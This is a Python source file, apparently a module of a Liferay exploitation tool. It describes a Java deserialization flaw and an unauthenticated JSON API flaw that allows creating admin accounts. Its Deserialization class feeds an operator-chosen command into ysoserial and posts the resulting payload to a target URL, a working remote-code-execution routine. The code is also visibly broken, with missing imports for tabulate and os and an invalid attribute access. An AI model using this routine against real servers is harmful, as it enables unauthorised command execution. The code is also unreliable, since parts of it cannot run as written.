import itertools
from builtins import range

import requests
from scapy import *
import socket
from bs4 import BeautifulSoup as Soup
import re
import urllib3
import time
from builtwith import builtwith

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# hostname = socket.gethostname()
# IPAddr = socket.gethostbyname(hostname)
# print("Your Computer IP Address is:" + IPAddr)

data_set = {
    1: [
        "Java Deserialization",
        "The process of converting application data to another format (usually binary) suitable for transportation is called serialization. The process of reading data back in after it has been serialized is called unserialization.\n"
        "Vulnerabilities arise when developers write code that accepts serialized data from users and attempt to unserialize it for use in the program\n",
        """
Available payload types                     
-----------------------------------------                   
BeanShell1                     Hibernate1
CommonsBeanutils1              Hibernate2            
CommonsCollections1            JSON1             
CommonsCollections2            Jdk7u21               
CommonsCollections3            MozillaRhino1                     
CommonsCollections4            MozillaRhino2                    
CommonsCollections5            Myfaces1   
CommonsCollections6            ROME        
Groovy1                        Spring1                    
Vaadin1                        Spring2 
          """,
        "Exploit through Java Serialization Vulnerability",
        "https://www.tenable.com/security/research/tra-2017-01\n"
        "https://issues.liferay.com/browse/LPE-15538\n"
        "https://issues.liferay.com/browse/LPS-64441"],
    2: [
        "Json Unauthenticated",
        "All JSON web services are, by default, accessible without authentication. Due to this vulnerability, anyone can create a new user with administrator rights",
        "Create admin account illegal",
        "https://issues.liferay.com/browse/LPS-26935\nhttps://www.acunetix.com/vulnerabilities/web/liferay-json-service-api-authentication-vulnerability\n"
        "https://dl.packetstormsecurity.net/1208-exploits/liferayjson-bypass.txt"]
}
gadgets = ["CommonsBeanUtils", "CommonsCollections1", "CommonsCollections2", "CommonsCollections3",
           "CommonsCollections4", "Jdk7u21", "Json1", "ROME", "Spring1", "Spring2", "BeanShell1", "CommonsCollections5",
           "CommonsCollections6", "CommonsCollections7", "Groovy1",
           "Hibernate1", "Hibernate2", "JRMPClient", "MozillaRhino1", "MozillaRhino2", "Myfaces1", "Vaadin1"]

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36 OPR/62.0.3331.99"})


# [LPS-64441] Java Serialization Vulnerability
class Deserialization:
    description = data_set[1][1]
    refer = data_set[1][3]
    gadget = data_set[1][2]

    def __init__(self, url, lib, command, path):
        self.url = url
        self.lib = lib
        self.command = command
        self.path = path

    # Begin Getter / Setter
    @property
    def url_gs(self):
        return self.url

    @property
    def lib_gs(self):
        return self.lib

    @property
    def command_gs(self):
        return self.command

    @property
    def path_gs(self):
        return self.path

    @url_gs.setter
    def url_gs(self, new_url):
        self.url = new_url

    @lib_gs.setter
    def lib_gs(self, new_lib):
        self.lib = new_lib

    @command_gs.setter
    def command_gs(self, new_command):
        self.command = new_command

    @path_gs.setter
    def path_gs(self, new_path):
        self.path = new_path

    # End of Getter / Setter

    # Show all options of payload
    def show_options(self):
        print(self.gadget)
        header = ["Name", "Current Setting", "Required", "Description"]
        data = [("url", self.url, "yes", "Target to exploit"),
                ("lib", self.lib, "yes", "Vulnerable library"),
                ("command", self.command, "yes", "Command to embed into payload"),
                ("path", self.path, "no", "Path of exists your payload")]
        print("")
        print(tabulate(data, headers=header))
        print("")

    # Execute Function
    def execute(self):
        try:
            if self.lib in gadgets and self.command and self.__dict__.k != "None":
                # Exploit with existing payload
                if self.path != "None":
                    payload = open(self.path, "rb")
                    rq = session.post(self.url, data=payload)
                    if rq.status_code == 200:
                        print("~> Payload sending successfully!")
                    else:
                        print("~> Error while sending payload!")
                # Generate payload and exploit
                else:
                    command = "java -jar {}/ysoserial-master-55f1e7c35c-1.jar {} '{}' > core/generated_payload/{}.bin".format(
                        os.getcwd(), self.lib, self.command, self.lib)
                    os.system(command)
                    payload = open("{}/core/generated_payload/{}.bin".format(os.getcwd(), self.lib), "rb")
                    rq = session.post(self.url, data=payload)
                    if rq.status_code == 200:
                        print("~> Payload sending successfully!")
                    else:
                        print("~> Error while sending payload!")
            else:
                print("Gadget or Command is not found!")
        except:
            print("[!] Something get error - See the log file!")


vul = Deserialization("None", "None", "None", "None")
for x in vul.__dict__.keys():
    print(x)
# getattr(vul,vul.__dict__.keys())

print(x for x in vul.__dict__.keys())

